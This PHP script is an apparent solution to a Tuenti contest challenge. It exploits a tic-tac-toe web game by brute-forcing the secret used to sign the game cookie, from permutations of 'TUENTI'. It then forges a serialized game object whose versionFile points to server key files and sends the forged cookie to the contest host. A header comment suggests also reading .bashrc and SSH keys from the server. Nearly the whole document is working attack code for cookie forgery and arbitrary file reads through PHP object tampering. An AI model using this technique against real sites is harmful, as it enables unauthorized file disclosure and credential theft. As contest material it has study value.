<?php
require_once('game.php');
require_once('board.php');
require_once('piece.php');

# Awesome problem. Loads of fun. Explanation:
#
#  1. Realize swap files will be available over http, download those required
#     for serialization.
#
#  2. See that cookie is in format $serialized_state | $some_md5
#  3. Read in code that it's actually the serialized game obj with md5
#     of the contents + a secret which is 4 capital letters of a random TUENTI
#     string permutation.
#  4. Permutate over all of them and find which one produces the proper hash
#     to get the key (a permutation).
#  5. Tamper with the game state and set the version file to one which we like,
#     namely the key/$input from the problem input.
#  6. (OPTIONAL) Print .bashrc and some ssh keys if available from ~ttt/

// list all permutations
function permute($str,$i,$n, &$permutations) {
  $ss = substr($str, 0, 4);
  if ($i == $n) {
    if (!array_key_exists($ss, $permutations)) {
      $permutations[$ss] = TRUE;
    }
  }
  else {
    for ($j = $i; $j < $n; $j++) {
      swap($str,$i,$j);
      permute($str, $i+1, $n, $permutations);
      swap($str,$i,$j); // backtrack.
    }
  }
}

// function to swap the char at pos $i and $j of $str.
function swap(&$str,$i,$j) {
  $temp = $str[$i];
  $str[$i] = $str[$j];
  $str[$j] = $temp;
}

$lines = file_get_contents('php://stdin');
$lines = explode("\n", $lines);
foreach ($lines as $input) {
  if (!$input) continue;
  $ch = curl_init('http://ttt.contest.tuenti.net/index.php');
  //  curl_setopt($ch, CURLOPT_VERBOSE, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  // get headers too with this line
  curl_setopt($ch, CURLOPT_HEADER, 1);
  $result = curl_exec($ch);
  // get cookie
  preg_match('/^Set-Cookie:\s*([^;]*)/mi', $result, $m);

  parse_str($m[1], $cookies);
  $c = $cookies['game'];
  $oldcookie = $cookies['game'];
  $hash = substr($c, strlen($c) - 32);
  $c = base64_decode(substr($c, 0, strlen($c) - 33));

  $str = "TUENTI";
  $permutations = array();
  permute($str,0,strlen($str), $permutations);

  $o = unserialize($c);
  $sero = serialize($o);

  // bomb tuenti find proper hash
  foreach ($permutations as $key => $v) {
    $gamestate = base64_encode($sero);
    $h = md5($gamestate . $key);
    $cookie = $gamestate . "|" . $h;

    if ($oldcookie == $cookie) {
      $valid_key = $key;
      break;
    }
  }

  // now we've got the key; we can inject our own crap
  $o->versionFile = "/home/ttt/data/keys/$input";
  $gamestate = base64_encode(serialize($o));
  $h = md5($gamestate . $valid_key);
  $cookie = $gamestate . "|" . $h;

  // send the altered request
  $ch = curl_init('http://ttt.contest.tuenti.net/index.php');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_COOKIE, "game=".$cookie);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  $result = curl_exec($ch);

  // get cookie that contains the solution
  preg_match('/^Set-Cookie:\s*X([^;]*)/mi', $result, $m);

  parse_str($m[1], $cookies);

  // voila
  print $cookies['-Tuenti-Powered-By'] . "\n";
}
